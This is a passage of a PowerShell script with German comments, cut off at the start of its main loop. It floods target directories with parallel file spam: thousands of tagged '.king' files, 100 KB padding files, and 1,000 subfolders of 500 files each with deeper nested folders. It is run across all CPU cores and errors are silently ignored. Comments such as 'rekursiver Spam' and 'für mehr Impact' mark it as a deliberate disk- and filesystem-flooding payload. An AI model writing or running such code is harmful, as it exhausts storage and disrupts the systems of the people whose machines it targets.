# ===== HAUPTSCHLEIFE - OPTIMIERT FÜR MAXIMALE PARALLELITÄT =====

# Konfiguration für optimale Performance
$maxParallel = [Environment]::ProcessorCount * 3  # Nutzt alle CPU-Kerne optimal
$scriptBlock = {
    param($ziel, $round, $computerName)
    
    try {
        if (Test-Path $ziel) {
            # Hauptordner erstellen
            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$round"
            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
            
            # 2000 DATEIEN PRO ZIEL - IN PARALLELEN BLÖCKEN
            $blockSize = 100
            $anzahlDateien = 2000
            
            # Dateien in Blöcken erstellen für bessere Performance
            for ($block = 0; $block -lt $anzahlDateien; $block += $blockSize) {
                $end = [Math]::Min($block + $blockSize, $anzahlDateien)
                
                # Block parallel verarbeiten
                $block..$end | ForEach-Object -Parallel {
                    $i = $_
                    $ziel = $using:ziel
                    $mainFolder = $using:mainFolder
                    $computerName = $using:computerName
                    $round = $using:round
                    
                    # Direkt im Zielordner
                    $directFile = Join-Path $ziel "MAIN2PACKET_SCAN_${i}.king"
                    "$computerName - MAIN2PACKET IST ÜBERALL RUNDE $round - DATEI $i" | Out-File $directFile -Encoding UTF8 -Force
                    
                    # Im Hauptordner
                    $mainFile = Join-Path $mainFolder "file_${i}.king"
                    "$computerName - MAIN2PACKET IST ÜBERALL RUNDE $round - DATEI $i" | Out-File $mainFile -Encoding UTF8 -Force
                    
                    # Zusätzliche große Datei für mehr Impact
                    if ($i % 10 -eq 0) {
                        $bigFile = Join-Path $mainFolder "BIG_${i}.king"
                        $bigContent = "$computerName - MAIN2PACKET MEGA DATEI RUNDE $round - " + ("X" * 100000)
                        $bigContent | Out-File $bigFile -Encoding UTF8 -Force
                    }
                } -ThrottleLimit 50
            }
            
            # 1000 UNTERORDNER - PARALLEL ERSTELLEN
            $unterordnerAnzahl = 1000
            $unterordnerBlock = 50
            
            for ($uBlock = 1; $uBlock -le $unterordnerAnzahl; $uBlock += $unterordnerBlock) {
                $uEnd = [Math]::Min($uBlock + $unterordnerBlock - 1, $unterordnerAnzahl)
                
                $uBlock..$uEnd | ForEach-Object -Parallel {
                    $u = $_
                    $mainFolder = $using:mainFolder
                    $round = $using:round
                    
                    $subFolder = Join-Path $mainFolder "SUB_$u"
                    New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                    
                    # 500 DATEIEN PRO UNTERORDNER
                    for ($s = 1; $s -le 500; $s++) {
                        $subFile = Join-Path $subFolder "subfile_${s}.king"
                        "SUB-ORDNER $u - DATEI $s - RUNDE $round" | Out-File $subFile -Encoding UTF8 -Force
                    }
                    
                    # Zusätzliche Unterordner im Unterordner (rekursiver Spam)
                    if ($u % 10 -eq 0) {
                        $deepFolder = Join-Path $subFolder "DEEP_$u"
                        New-Item -Path $deepFolder -ItemType Directory -Force | Out-Null
                        for ($d = 1; $d -le 100; $d++) {
                            $deepFile = Join-Path $deepFolder "deep_${d}.king"
                            "DEEP ORDNER $u - DATEI $d" | Out-File $deepFile -Encoding UTF8 -Force
                        }
                    }
                } -ThrottleLimit 25
            }
        }
    } catch {
        # Fehler ignorieren - weitermachen!
    }
}

# ===== HAUPTSCHEIFE MIT PARALLELEN ZIELEN =====
Write-Host "[INFO] Starte parallele Verarbeitung mit $maxParallel Threads..." -ForegroundColor Cyan

while ($global:currentRound -lt $global:maxRounds) {
